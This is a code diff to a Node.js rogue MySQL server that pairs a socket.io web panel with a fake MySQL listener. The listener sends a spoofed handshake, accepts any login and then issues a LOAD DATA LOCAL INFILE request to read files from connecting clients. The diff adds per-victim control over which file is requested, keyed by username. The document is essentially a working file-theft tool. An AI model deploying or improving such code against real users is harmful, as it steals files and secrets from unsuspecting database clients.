@@ -7,6 +7,7 @@ var httpserver = require('http').Server(app);
 var io = require('socket.io')(httpserver);
 var gsocket = {};
 var net = require("net");
+var mysqlfile = {};
 
 httpserver.listen(3000);
 
@@ -18,10 +19,14 @@ io.on('connection', function (socket) {
 	var randDomain = getRandomDomain(5);
 	socket.emit('randomDomain', { domain: randDomain });
 	gsocket[randDomain] = socket;
+	socket.on('mysql',function(data){
+		mysqlfile[randDomain.split('.')[0]] = data.filename;
+		// console.log(mysqlfile[randDomain]);
+	});
  	socket.on('disconnect',function(){
  		delete gsocket[randDomain];
  		console.log('disconnect');
-  });
+	});
 });
 
 function getRandomDomain(len){
@@ -69,7 +74,6 @@ var server = net.createServer(function(socket){
     var handshake = "\x45\x00\x00\x00\x0a\x35\x2e\x31\x2e\x36\x33\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x30\x2e\x30\x34\x2e\x31\x00\x26\x00\x00\x00\x7a\x42\x7a\x60\x51\x56\x3b\x64\x00\xff\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x4c\x2f\x44\x47\x77\x43\x2a\x43\x56\x63\x72\x00";
     var authsuccess = "\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00";
     var someshit = "\x07\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00";
-    var wantfile = String.fromCharCode(filename.length+1)+"\x00\x00\x01\xFB"+filename
     /* 发送数据 */
     socket.write(handshake,'binary',function(){
         socket.once('data',function(data){
@@ -78,6 +82,11 @@ var server = net.createServer(function(socket){
             //socket.write(someshit,'binary');
             var userinfo = data.toString();
             var username = userinfo.slice(36).split("\x00")[0];
+            if(typeof(mysqlfile[username]) !== "undefined"){
+            	filename = mysqlfile[username];
+            	console.log(mysqlfile);
+            }
+            var wantfile = String.fromCharCode(filename.length+1)+"\x00\x00\x01\xFB"+filename
             console.log("username: "+username);
             socket.once('data',function(data){
                 socket.write(wantfile,'binary');
